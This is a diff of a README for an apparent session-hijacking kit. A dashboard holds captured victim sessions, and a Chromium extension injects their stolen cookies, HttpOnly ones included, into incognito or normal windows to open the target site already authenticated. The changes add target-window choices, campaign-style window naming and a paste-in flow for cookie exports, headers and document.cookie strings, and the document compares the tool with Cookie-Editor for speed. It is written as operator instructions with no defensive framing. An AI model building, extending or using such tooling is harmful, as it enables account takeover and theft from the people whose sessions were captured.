@@ -560,7 +560,15 @@ curl -u admin:PASS -X POST -H 'Content-Type: application/json' \
 
 The `extension/` folder in the repo is a Manifest V3 Chromium extension that automates session takeover — no Cookie-Editor needed. It injects cookies directly via the browser's native API, which works for HttpOnly cookies that JavaScript cannot touch.
 
-**It does not touch the profile you are already signed into.** By default the victim's cookies are written into an *isolated* (incognito) store and the target opens there — a separate cookie jar, so nothing you are logged into gets overwritten and closing the window throws the victim session away. Everything about it is disposable.
+**It never silently touches the profile you are signed into.** You choose where each takeover lands:
+
+| Target | Cookie jar | Your own logins |
+|--|--|--|
+| **Incognito window** | separate | untouched; close the window to discard |
+| **Normal window** | shared with yours | the session's domains are overwritten |
+| **This tab** | shared with yours | same as normal, no new window |
+
+Default is **Normal**; set your preference in the popup or options page. Whichever you pick, a takeover **replaces** the previous victim on the relevant domains rather than merging with them, so nothing is ever half-and-half.
 
 ## Install (one-time, on the machine you use to access the dashboard)
 
@@ -578,32 +586,48 @@ Pull the latest repo on that machine, then:
 > ```
 > Then load it from the local copy.
 
-> **Leave "Allow in incognito" alone.** The manifest declares `"incognito": "spanning"`, so the extension is available in incognito automatically — that is what makes the isolated window possible. If incognito is blocked by policy the extension falls back to a normal window and says so in the popup.
+> **Leave "Allow in incognito" alone.** The manifest declares `"incognito": "spanning"`, which is what lets the extension write into an incognito window. If incognito is blocked by policy, the popup says so and falls back to a normal window.
 
 ## Using it
 
 1. Open the dashboard and click any session row that shows a token indicator
 2. Click **Take over**
-3. The cookies go into the isolated window and the real target site opens there, already authenticated
-4. The pinned first tab in that window names the victim so you can tell windows apart
+3. Pick **Incognito window**, **Normal window** or **This tab** — the default is sent automatically
+4. The target opens in that window, already authenticated
 
-Only **one victim is live in the isolated window at a time** — that is a property of incognito, which has a single jar. Taking over a second victim replaces the first cleanly: every cookie on the relevant domains is cleared before the new ones are written, so nothing is merged or left stale. Your normal profile is never involved.
+The window's first tab is a pinned card naming the victim (also used as the tab-group label), so several windows are tellable apart. The modal reports how many cookies went in, how many were cleared first, and flags any that failed — a failed cookie does not always matter.
 
-Need two victims at once, side by side? Use **"Use this profile instead"**, or run a second Chrome with its own profile: `chrome --user-data-dir=/tmp/chrome-victim2`.
+Want two victims at once? Use the Incognito target for one and Normal for the other, or run a second Chrome with its own profile: `chrome --user-data-dir=/tmp/victim2`.
 
-The modal reports how many cookies went in, how many were cleared first, and flags any that failed. A failed cookie does not always matter — not every cookie is needed for authentication.
+## Naming windows
 
-## Extension popup and settings
+The card and tab group are labelled from the victim's address. Set a **window name prefix** in the popup/options (e.g. `camp-` → `camp-alice@contoso.com`), or rename the live window from the popup. Renaming is cosmetic — it never changes the cookies.
 
-Click the Session Injector icon in the toolbar. It shows:
+## Popup and settings
 
-- **Status** — whether a dashboard tab is open, and whether the isolated window exists (with a *Focus* button)
-- **Selected session** — the row you clicked, with one-click *Isolated* / *Here*
-- **Live in the isolated window** — which victim is currently loaded, with *Focus window* and *Clear*
+Click the Session Injector icon in the toolbar:
+
+- **Status** — whether a dashboard tab is open, and which takeover windows exist (with *Focus*)
+- **Selected session** — the row you clicked, with the three target buttons
+- **Live: <name>** — what is currently loaded, with *Focus*, *Set* (rename) and *Clear cookies*
 - **Recent sessions** — replay any of the last 8 without going back to the dashboard
-- **Behaviour** — `Auto-open new captures` and the default target
+- **Behaviour** — default target, name prefix, auto-open, *Close windows*
 
-Right-click the icon → **Options** (or the *Settings* link) for the wider view: full recent list, plus the dashboard URL and login. With those set, the popup can take over any session even when no dashboard tab is open.
+Right-click the icon → **Options** for the wider view, plus the dashboard URL and login. With those set, the popup can take over any session even when no dashboard tab is open.
+
+## Pasting cookies in
+
+When the data already exists — a `.json` export, a `Cookie:` header, a `document.cookie`
+string — you do not need a live session. Open **paste cookies** (popup → *paste
+cookies*, or the button on the Recent row), then:
+
+1. Give the **target URL** (where to open, and which domain plain text belongs to)
+2. Paste, or drop a file. *Check* shows the parsed count and domains first
+3. Optionally name the window, pick the target, hit **Take over**
+
+Accepted formats: Cookie-Editor style JSON, this project's own cookie export, a plain
+`{"name":"value"}` map, a raw `Cookie: a=1; b=2` header, and `a=1; b=2` text.
+The extension reports exactly what it parsed before writing anything.
 
 ## What it does vs. Cookie-Editor
 
@@ -611,9 +635,9 @@ Right-click the icon → **Options** (or the *Settings* link) for the wider view
 |--|---------------------------|------------------------|
 | HttpOnly cookies | Injected automatically | Also works |
 | Steps required | 1 click | Download → open tab → import → reload |
-| Target URL | Opens automatically | You click "Open Target Site" |
-| Disturbs your own logins | No (isolated window) | Yes (same jar) |
-| Switch victim | One click, stale cookies cleared | Manual delete first |
+| Offline data (file / header) | Paste-in, same flow | Import only |
+| Disturbs your own logins | Optional (incognito target) | Yes |
+| Switch victim | One click, stale domains cleared | Manual delete first |
 
 ## Updating the extension after a repo pull
 
@@ -621,7 +645,7 @@ The extension code is in `extension/` — if it changes after a pull, go to `chr
 
 ## Testing the extension without a browser
 
-`node extension/test.js` runs the background worker against mocked Chrome APIs and asserts the profile isolation guarantees: the isolated store is written and the default store is not, `sameSite=none` is upgraded to `secure`, `__Host-` cookies drop their domain, switching victims clears the previous domains, and closing the window forgets the session.
+`node extension/test.js` runs the background worker against mocked Chrome APIs and asserts the guarantees: the incognito jar is written and the default jar is not, `sameSite=none` is upgraded to `secure`, `__Host-` cookies drop their domain, switching victims clears the previous domains, `clear` only touches jars actually written to, and the paste parser handles every accepted format. 69 assertions.
 
 ---
 
